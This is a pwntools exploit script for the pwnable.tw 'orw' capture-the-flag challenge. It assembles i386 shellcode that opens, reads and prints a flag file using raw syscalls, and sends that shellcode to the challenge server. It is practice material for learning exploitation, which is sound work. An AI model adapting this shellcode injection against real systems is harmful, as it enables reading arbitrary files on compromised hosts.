from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10001

context(os='linux', arch='i386')
context.log_level = 'debug'

shell_code = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'), # Flag path
    'mov edx, 0', # Mode
    'mov ecx, 0', # Open syscall flag
    'mov ebx, esp', # Buffer
    'mov eax, 5', # Open syscall number
    'int 0x80',

    'mov edx, 128', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, eax', # fd
    'mov eax, 3', # Read syscall number
    'int 0x80',

    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 0', # fd
    'mov eax, 4', # Write syscall number
    'int 0x80',
]))

# for executing code on remote or local
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process('./orw')

log.info('Pwning start')
conn.recvuntil("Give my your shellcode:")
conn.sendline(shell_code)
conn.recvall()
